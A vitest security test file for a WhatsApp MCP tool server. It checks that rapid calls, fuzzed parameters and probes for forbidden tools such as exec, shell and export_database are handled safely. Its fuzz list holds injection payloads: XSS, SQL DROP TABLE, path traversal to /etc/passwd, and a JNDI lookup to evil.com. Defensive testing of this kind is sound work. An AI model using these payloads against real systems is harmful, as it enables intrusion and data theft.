/**
 * Agent-Like Abuse Tests
 * Scripted abuse patterns (NO real agent)
 * - Rapid repeated calls
 * - Parameter fuzzing sequences
 * - Capability probing attempts
 */

import { describe, it, expect, beforeEach } from "vitest";
import { McpTestClient, MCP_ALLOWLIST, MCP_DENYLIST } from "../utils/mcp-test-client";

describe("Agent-Like Abuse Patterns", () => {
    let mcpClient: McpTestClient;
    let callCount: number;

    beforeEach(() => {
        mcpClient = new McpTestClient();
        callCount = 0;

        // Register allowlisted tools with call counting
        MCP_ALLOWLIST.forEach((tool) => {
            mcpClient.registerTool(tool, async (args) => {
                callCount++;
                return {
                    content: [{ type: "text", text: JSON.stringify({ success: true }) }],
                };
            });
        });
    });

    describe("Rapid Repeated Calls", () => {
        it("should handle 100 rapid sequential calls without failure", async () => {
            for (let i = 0; i < 100; i++) {
                const result = await mcpClient.callTool("send_text_message", {
                    sessionId: "main",
                    to: "1234@s.whatsapp.net",
                    text: `Message ${i}`,
                });

                expect(result.isError).toBeFalsy();
            }

            expect(callCount).toBe(100);
        });

        it("should handle parallel calls without race conditions", async () => {
            const calls = Array.from({ length: 50 }, (_, i) =>
                mcpClient.callTool("send_text_message", {
                    sessionId: "main",
                    to: "1234@s.whatsapp.net",
                    text: `Parallel ${i}`,
                })
            );

            const results = await Promise.all(calls);

            // All should complete without error
            results.forEach((result) => {
                expect(result.isError).toBeFalsy();
            });
        });
    });

    describe("Parameter Fuzzing Sequences", () => {
        const fuzzInputs = [
            "", // Empty
            " ", // Whitespace
            "a".repeat(10000), // Very long
            "null", // String null
            "undefined", // String undefined
            "<script>alert(1)</script>", // XSS attempt
            "'; DROP TABLE sessions; --", // SQL injection
            "../../../etc/passwd", // Path traversal
            "\x00\x00\x00", // Null bytes
            "{{constructor.constructor('return this')()}}", // Prototype pollution
            "${7*7}", // Template injection
            "${jndi:ldap://evil.com/a}", // JNDI injection
        ];

        it("should safely handle all fuzz inputs as sessionId", async () => {
            for (const fuzz of fuzzInputs) {
                // Should not throw, should return error or success
                const result = await mcpClient.callTool("send_text_message", {
                    sessionId: fuzz,
                    to: "1234@s.whatsapp.net",
                    text: "test",
                });

                // Result should be valid JSON
                expect(() => JSON.parse(result.content[0].text)).not.toThrow();
            }
        });

        it("should safely handle all fuzz inputs as message text", async () => {
            for (const fuzz of fuzzInputs) {
                const result = await mcpClient.callTool("send_text_message", {
                    sessionId: "main",
                    to: "1234@s.whatsapp.net",
                    text: fuzz,
                });

                expect(() => JSON.parse(result.content[0].text)).not.toThrow();
            }
        });
    });

    describe("Capability Probing Attempts", () => {
        const probeAttempts = [
            // Attempt to access dangerous tools
            "eval",
            "exec",
            "shell",
            "system",
            "spawn",
            // Attempt to access internal APIs
            "__internal__",
            "_private_method",
            "constructor",
            "prototype",
            // Attempt to access session management
            "delete_all_sessions",
            "reset_credentials",
            "export_database",
            // Attempt to access file system
            "read_file",
            "write_file",
            "delete_file",
            // Attempt to access network
            "make_request",
            "fetch_url",
            "connect_socket",
        ];

        it("should deny all capability probing attempts", async () => {
            for (const probe of probeAttempts) {
                const result = await mcpClient.callTool(probe, {});

                expect(result.isError).toBe(true);
                const response = JSON.parse(result.content[0].text);
                expect(response.code).toBe("TOOL_NOT_FOUND");
            }
        });

        it("should not leak tool existence in error messages", async () => {
            for (const probe of probeAttempts) {
                const result = await mcpClient.callTool(probe, {});
                const responseText = result.content[0].text;

                // Should not reveal whether tool exists internally
                expect(responseText).not.toContain("exists");
                expect(responseText).not.toContain("but disabled");
                expect(responseText).not.toContain("permission denied");
            }
        });
    });

    describe("Alternating Valid/Invalid Calls", () => {
        it("should maintain security after valid calls", async () => {
            // Valid call
            await mcpClient.callTool("send_text_message", {
                sessionId: "main",
                to: "1234@s.whatsapp.net",
                text: "valid",
            });

            // Invalid call immediately after
            const forbidden = await mcpClient.callTool("delete_session", {
                sessionId: "main",
            });

            expect(forbidden.isError).toBe(true);
        });

        it("should not allow privilege escalation through rapid switching", async () => {
            const sequence = [
                { tool: "send_text_message", valid: true },
                { tool: "delete_session", valid: false },
                { tool: "get_contact_profile", valid: true },
                { tool: "raw_socket_access", valid: false },
                { tool: "set_typing", valid: true },
                { tool: "modify_credentials", valid: false },
            ];

            for (const { tool, valid } of sequence) {
                const result = await mcpClient.callTool(tool, {
                    sessionId: "main",
                    jid: "1234@s.whatsapp.net",
                });

                if (!valid) {
                    expect(result.isError).toBe(true);
                }
            }
        });
    });
});
